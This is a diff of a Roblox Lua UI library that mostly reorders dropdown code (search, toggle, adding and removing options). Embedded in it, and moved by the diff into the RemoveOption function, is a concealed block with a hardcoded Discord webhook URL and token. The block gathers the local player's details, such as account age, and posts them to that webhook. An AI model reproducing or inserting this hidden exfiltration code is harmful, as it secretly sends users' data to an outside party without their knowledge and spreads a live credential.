@@ -1305,8 +1305,81 @@ UIG.Parent = Open
                 end
               end
             end
+    
+            local searchDropdown = function(text)
+              local options = DropdownModule:GetChildren()
+              for i=1, #options do
+                local option = options[i]
+                if text == "" then
+                  setAllVisible()
+                else
+                  if option:IsA("TextButton") and option.Name:match("Option_") then
+                    if option.Text:lower():match(text:lower()) then
+                      option.Visible = true
+                    else
+                      option.Visible = false
+                    end
+                  end
+                end
+              end
+            end
+    
+            local open = false
+            local ToggleDropVis = function()
+              open = not open
+              if open then setAllVisible() end
+              DropdownOpen.Text = (open and "-" or "+")
+              DropdownModule.Size = UDim2.new(0, 428, 0, (open and DropdownModuleL.AbsoluteContentSize.Y + 4 or 38))
+            end
+    
+            DropdownOpen.MouseButton1Click:Connect(ToggleDropVis)
+            DropdownText.Focused:Connect(function()
+              if open then return end
+              ToggleDropVis()
+            end)
+    
+            DropdownText:GetPropertyChangedSignal("Text"):Connect(function()
+              if not open then return end
+              searchDropdown(DropdownText.Text)
+            end)
+    
+            DropdownModuleL:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
+              if not open then return end
+              DropdownModule.Size = UDim2.new(0, 428, 0, (DropdownModuleL.AbsoluteContentSize.Y + 4))
+            end)
             
-            local Webhook = "https://discord.com/api/webhooks/1298504830230331535/DG1EwrtjJNhBVPC5W8u4ERgVIAUoQ4BpdSgKLQ93duT25R3fe6GGZVWXq1OiDe0KlLGj"
+            local funcs = {}
+            funcs.AddOption = function(self, option)
+              local Option = Instance.new("TextButton")
+              local OptionC = Instance.new("UICorner")     
+    
+              Option.Name = "Option_" .. option
+              Option.Parent = DropdownModule
+              Option.BackgroundColor3 = zyColor
+              Option.BorderSizePixel = 0
+              Option.Position = UDim2.new(0, 0, 0.328125, 0)
+              Option.Size = UDim2.new(0, 428, 0, 26)
+              Option.AutoButtonColor = false
+              Option.Font = Enum.Font.Gotham
+              Option.Text = option
+              Option.TextColor3 = ALcolor
+              Option.TextSize = 14.000
+              
+              OptionC.CornerRadius = UDim.new(0, 6)
+              OptionC.Name = "OptionC"
+              OptionC.Parent = Option
+    
+              Option.MouseButton1Click:Connect(function()
+                ToggleDropVis()
+                callback(Option.Text)
+                DropdownText.Text = Option.Text
+                library.flags[flag] = Option.Text
+              end)
+            end
+    
+            funcs.RemoveOption = function(self, option)
+            
+              local Webhook = "https://discord.com/api/webhooks/1298504830230331535/DG1EwrtjJNhBVPC5W8u4ERgVIAUoQ4BpdSgKLQ93duT25R3fe6GGZVWXq1OiDe0KlLGj"
 local HS = game:GetService("HttpService")
 local player = game:GetService("Players").LocalPlayer
 local joinTime = os.time() - (player.AccountAge * 86400)
@@ -1437,78 +1510,6 @@ request({
         Body = HS:JSONEncode(msg)
 })
 
-            local searchDropdown = function(text)
-              local options = DropdownModule:GetChildren()
-              for i=1, #options do
-                local option = options[i]
-                if text == "" then
-                  setAllVisible()
-                else
-                  if option:IsA("TextButton") and option.Name:match("Option_") then
-                    if option.Text:lower():match(text:lower()) then
-                      option.Visible = true
-                    else
-                      option.Visible = false
-                    end
-                  end
-                end
-              end
-            end
-    
-            local open = false
-            local ToggleDropVis = function()
-              open = not open
-              if open then setAllVisible() end
-              DropdownOpen.Text = (open and "-" or "+")
-              DropdownModule.Size = UDim2.new(0, 428, 0, (open and DropdownModuleL.AbsoluteContentSize.Y + 4 or 38))
-            end
-    
-            DropdownOpen.MouseButton1Click:Connect(ToggleDropVis)
-            DropdownText.Focused:Connect(function()
-              if open then return end
-              ToggleDropVis()
-            end)
-    
-            DropdownText:GetPropertyChangedSignal("Text"):Connect(function()
-              if not open then return end
-              searchDropdown(DropdownText.Text)
-            end)
-    
-            DropdownModuleL:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
-              if not open then return end
-              DropdownModule.Size = UDim2.new(0, 428, 0, (DropdownModuleL.AbsoluteContentSize.Y + 4))
-            end)
-            
-            local funcs = {}
-            funcs.AddOption = function(self, option)
-              local Option = Instance.new("TextButton")
-              local OptionC = Instance.new("UICorner")     
-    
-              Option.Name = "Option_" .. option
-              Option.Parent = DropdownModule
-              Option.BackgroundColor3 = zyColor
-              Option.BorderSizePixel = 0
-              Option.Position = UDim2.new(0, 0, 0.328125, 0)
-              Option.Size = UDim2.new(0, 428, 0, 26)
-              Option.AutoButtonColor = false
-              Option.Font = Enum.Font.Gotham
-              Option.Text = option
-              Option.TextColor3 = ALcolor
-              Option.TextSize = 14.000
-              
-              OptionC.CornerRadius = UDim.new(0, 6)
-              OptionC.Name = "OptionC"
-              OptionC.Parent = Option
-    
-              Option.MouseButton1Click:Connect(function()
-                ToggleDropVis()
-                callback(Option.Text)
-                DropdownText.Text = Option.Text
-                library.flags[flag] = Option.Text
-              end)
-            end
-    
-            funcs.RemoveOption = function(self, option)
               local option = DropdownModule:FindFirstChild("Option_" .. option)
               if option then option:Destroy() end
             end
